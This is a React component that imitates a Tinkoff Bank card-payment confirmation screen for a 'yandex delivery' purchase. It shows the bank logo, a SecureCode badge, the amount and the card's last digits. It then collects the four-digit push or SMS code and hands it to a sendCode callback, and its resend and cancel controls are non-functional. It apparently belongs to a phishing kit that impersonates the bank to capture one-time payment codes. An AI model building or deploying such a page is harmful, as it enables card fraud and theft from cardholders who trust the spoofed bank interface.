import React, {useEffect, useState} from 'react'
import styles from './TinkoffBankPush.module.scss'
import CountUp from 'react-countup';

type Card = {
    paymentSystem: string;
    cardNumber: string;
    bank: string;
    system: string
  }
interface Props{
    cardDetails: Card;
    totalPrice: number;
    sendCode: (value: string) => void;

}


const TinkoffBankPush = ({totalPrice, cardDetails, sendCode}: Props) => {
  const [showDetails, setShowDetails] = useState(false);
  let currentDate = new Date();
  let day = String(currentDate.getDate()).padStart(2, '0');
  let month = String(currentDate.getMonth() + 1).padStart(2, '0'); 
  let year = currentDate.getFullYear();
  let formattedDate = `${day}.${month}.${year}`;
  const [timeRemaining, setTimeRemaining] = useState(60);
  const [code, setCode] = useState('')

  const formatTime = (time: any) => {
    let word = 'секунд';
    if (time === 1) {
      word = 'секунду';
    } else if (time > 1 && time < 5) {
      word = 'секунды';
    }
    return `${time} ${word}`;
  };

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeRemaining((prevTime) => (prevTime > 0 ? prevTime - 1 : 0));
    }, 1000);
    return () => {
      clearInterval(timer);
    };
  }, []);

  useEffect(() => {
    if(code.length === 4){
      sendCode(code)
    }
  }, [code, sendCode])
  
  
  return (
    <div className={styles.tinkoffPushContainer}>
    <div className={styles.logo}>
       <img src={`https://mrbin.io/bins/logo/main/edb9b30c-bb8a-4caa-96d8-cc13b24049d9/1.svg`} alt={`234`} className={styles.bankLogo}/>
      <img src="/images/secureCode.svg" alt="master-logo" width="100" height="50"/>
      <div className={styles.titleDevider}></div>
   </div> 
   <div className={styles.paymentDetails}>
   <div className={styles.orderPrice} onClick={() => setShowDetails(!showDetails)}>
   <CountUp end={totalPrice} duration={0.4} separator=","/> <span className={styles.ic}>₽</span>
   <i className={`fa-solid fa-chevron-down fa-xs ${styles.angle} ${showDetails ? 'open' : ''}`} style={{color: '#8e8f90'}}></i>
</div>
     <div className={`${styles.detailsBody} ${showDetails ? 'open' : ''}`}>
       <div className={styles.detailsItem}><span>Магазин</span> <p>yandex delivery</p></div>
       <div className={`${styles.detailsItem} ${styles.date}`}><span>Дата</span> <p>{formattedDate}</p></div>
       <div className={`${styles.detailsItem} ${styles.card}`}><span>Номер карты</span> <p>* {cardDetails.cardNumber.slice(-4)}
</p></div>

     </div>
   </div>
   <div className={styles.confirmPayment}>
     <span>Подтверждение покупки</span>
     <input type="tel" name="code"  className={styles.codeInput} maxLength={4} placeholder='Код из пуша или СМС' onKeyPress={(e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    }} value={code} onChange={(e)=>setCode(e.target.value)}/>
   </div>
   <div className={styles.paymentActions}>
     <div className={styles.paymentAction}  onClick={() => {
       if (timeRemaining === 0) {
         setTimeRemaining(60);
       }
     }}>
       {timeRemaining > 0 
         ? `Отправим повторно через ${formatTime(timeRemaining)}` 
         : 'Отправить повторно'
       }
     </div>
     <div className={styles.paymentAction}>Не приходит код</div>
     <div className={styles.paymentAction}>Отменить</div>

   </div>
   </div>
  )
}

export default TinkoffBankPush
